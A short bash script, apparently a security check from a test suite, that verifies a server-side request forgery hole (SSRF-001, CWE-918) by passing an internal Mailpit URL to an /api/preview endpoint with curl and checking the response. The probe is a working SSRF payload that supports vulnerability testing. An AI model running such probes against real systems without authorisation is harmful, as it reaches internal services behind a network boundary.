#!/usr/bin/env bash
# SSRF-001 (CWE-918): /api/preview fetches an arbitrary URL server-side, reaching
# the internal-only Mailpit service.
set -e; . "$(dirname "$0")/_lib.sh"
curl -s "$TARGET/api/preview?url=http://mailpit:8025/" | grep -q 'Mailpit'
